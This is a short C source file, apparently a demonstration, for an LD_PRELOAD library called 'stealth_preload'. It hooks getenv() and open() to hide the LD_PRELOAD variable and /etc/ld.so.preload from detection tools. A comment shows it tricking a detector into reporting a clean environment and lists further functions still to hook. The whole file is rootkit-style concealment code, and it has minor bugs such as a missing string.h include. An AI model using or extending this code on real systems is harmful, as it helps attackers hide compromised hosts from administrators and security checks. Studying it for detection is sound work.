#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <dlfcn.h>
#include <limits.h>
#include <errno.h>
#include <sys/stat.h>
#include <fcntl.h>

/*
% gcc -shared -fpic -ldl -o stealth_preload.so stealth_preload.c
% LD_PRELOAD=./stealth_preload.so ./detect 
Environment is clean
/etc/ld.so.preload is not present
*/

// We will store the real function pointer in here

int (*o_open)(const char*, int oflag) = NULL;
char* (*o_getenv)(const char *) = NULL;

char* getenv(const char *name)
{
    if(!o_getenv)
        // Find the real function pointer
        o_getenv = dlsym(RTLD_NEXT, "getenv");
    if(strcmp(name, "LD_PRELOAD") == 0)
        // This environment variable does not exist, I swear
        return NULL;
    // Everything is ok, call the real getenv
    return o_getenv(name);
}

int open(const char *path, int oflag, ...)
{
    char real_path[PATH_MAX];
    if(!o_open)
        // Find the real function pointer
        o_open = dlsym(RTLD_NEXT, "open");
    // Resolve symbolic links and dot notation fu
    realpath(path, real_path);
    if(strcmp(real_path, "/etc/ld.so.preload") == 0)
    {
        // This file does not exist, I swear.
        errno = ENOENT;
        return -1;
    }
    // Everything is ok, call the real open
    return o_open(path, oflag);
}

// Still many other functions to hook, like fopen, open64, stat, readdir, 
// rename, unlink, etc.
